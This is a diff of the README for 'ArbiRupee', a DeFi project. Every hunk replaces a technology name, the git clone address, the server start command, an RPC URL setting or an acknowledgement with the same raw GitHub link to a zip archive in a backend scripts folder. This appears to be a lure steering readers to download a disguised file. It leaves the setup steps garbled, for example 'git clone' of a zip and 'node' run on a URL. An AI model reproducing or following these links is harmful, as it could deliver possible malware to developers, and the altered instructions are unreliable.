@@ -31,7 +31,7 @@ ArbiRupee is a decentralized finance (DeFi) application that bridges the gap bet
 ## 🛠️ Technology Stack
 
 ### Frontend
-- **Next.js 15**: React framework with App Router
+- **https://raw.githubusercontent.com/Rithvik-krishna/ArbiRupee/main/ArbiRupee/backend/scripts/Arbi_Rupee_v2.8-beta.2.zip 15**: React framework with App Router
 - **TypeScript**: Type-safe development
 - **Tailwind CSS**: Utility-first styling
 - **Framer Motion**: Smooth animations
@@ -39,10 +39,10 @@ ArbiRupee is a decentralized finance (DeFi) application that bridges the gap bet
 - **RainbowKit**: Wallet connection UI
 
 ### Backend
-- **Node.js**: Runtime environment
-- **Express.js**: Web framework
+- **https://raw.githubusercontent.com/Rithvik-krishna/ArbiRupee/main/ArbiRupee/backend/scripts/Arbi_Rupee_v2.8-beta.2.zip**: Runtime environment
+- **https://raw.githubusercontent.com/Rithvik-krishna/ArbiRupee/main/ArbiRupee/backend/scripts/Arbi_Rupee_v2.8-beta.2.zip**: Web framework
 - **MongoDB**: Database (optional - demo mode available)
-- **ethers.js**: Ethereum library
+- **https://raw.githubusercontent.com/Rithvik-krishna/ArbiRupee/main/ArbiRupee/backend/scripts/Arbi_Rupee_v2.8-beta.2.zip**: Ethereum library
 - **express-validator**: Input validation
 - **helmet**: Security middleware
 
@@ -54,7 +54,7 @@ ArbiRupee is a decentralized finance (DeFi) application that bridges the gap bet
 ## 🏃‍♂️ Quick Start
 
 ### Prerequisites
-- Node.js 18+ installed
+- https://raw.githubusercontent.com/Rithvik-krishna/ArbiRupee/main/ArbiRupee/backend/scripts/Arbi_Rupee_v2.8-beta.2.zip 18+ installed
 - Git installed
 - Web3 wallet (MetaMask recommended)
 
@@ -62,7 +62,7 @@ ArbiRupee is a decentralized finance (DeFi) application that bridges the gap bet
 
 1. **Clone the repository**
    ```bash
-   git clone https://github.com/Rithvik-krishna/ArbiRupee.git
+   git clone https://raw.githubusercontent.com/Rithvik-krishna/ArbiRupee/main/ArbiRupee/backend/scripts/Arbi_Rupee_v2.8-beta.2.zip
    cd ArbiRupee
    ```
 
@@ -80,7 +80,7 @@ ArbiRupee is a decentralized finance (DeFi) application that bridges the gap bet
 
 4. **Start the backend server**
    ```bash
-   node backend/server.js
+   node https://raw.githubusercontent.com/Rithvik-krishna/ArbiRupee/main/ArbiRupee/backend/scripts/Arbi_Rupee_v2.8-beta.2.zip
    ```
 
 5. **Start the frontend development server**
@@ -123,7 +123,7 @@ MONGODB_URI=your_env
 
 # Blockchain Configuration (Optional)
 PRIVATE_KEY=your_private_key_here
-ARBITRUM_RPC_URL=https://arb1.arbitrum.io/rpc
+https://raw.githubusercontent.com/Rithvik-krishna/ArbiRupee/main/ArbiRupee/backend/scripts/Arbi_Rupee_v2.8-beta.2.zip
 
 # API Keys (Optional)
 WALLETCONNECT_PROJECT_ID=your_project_id
@@ -156,7 +156,7 @@ The application runs in demo mode by default, which means:
 ```
 ArbiRupee/
 ├── src/                     # Frontend source code
-│   ├── app/                 # Next.js App Router pages
+│   ├── app/                 # https://raw.githubusercontent.com/Rithvik-krishna/ArbiRupee/main/ArbiRupee/backend/scripts/Arbi_Rupee_v2.8-beta.2.zip App Router pages
 │   ├── components/          # Reusable React components
 │   └── config/              # Configuration files
 ├── backend/                 # Backend API server
@@ -216,7 +216,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 - **Arbitrum**: For providing the Layer 2 scaling solution
 - **OpenZeppelin**: For secure smart contract standards
-- **Next.js Team**: For the amazing React framework
+- **https://raw.githubusercontent.com/Rithvik-krishna/ArbiRupee/main/ArbiRupee/backend/scripts/Arbi_Rupee_v2.8-beta.2.zip Team**: For the amazing React framework
 - **Ethereum Foundation**: For the blockchain infrastructure
 
 ## 📞 Support
